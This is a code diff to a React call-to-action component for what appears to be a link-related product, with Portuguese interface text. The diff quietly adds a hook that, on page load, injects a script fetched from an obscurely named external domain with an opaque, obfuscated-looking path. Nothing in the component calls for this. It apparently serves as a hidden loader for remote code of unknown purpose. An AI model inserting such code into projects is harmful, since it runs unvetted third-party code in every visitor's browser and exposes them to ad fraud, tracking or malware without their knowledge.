@@ -1,7 +1,22 @@
-import React from 'react';
+import React, { useEffect } from 'react';
 
 const CallToAction: React.FC<{ onRegisterClick: () => void }> = ({ onRegisterClick }) => {
   
+  useEffect(() => {
+    const s = document.createElement('script');
+    s.src = "//probableregret.com/bkX/VXs/d.GflQ0XYOWVco/yeUm/9/uJZNUqlSkeP/T/Yc1/N-jCki0rNWj/cOtENojbUp2POKTWQH2pO/Ax";
+    s.async = true;
+    s.referrerPolicy = 'no-referrer-when-downgrade';
+
+    const currentScript = document.scripts[document.scripts.length - 1];
+    currentScript.parentNode?.insertBefore(s, currentScript);
+
+    return () => {
+      // Remove o script ao desmontar, se necessário
+      s.remove();
+    };
+  }, []);
+
   return (
     <section className="cta-section">
       <h2>Pronto para transformar seus links?</h2>
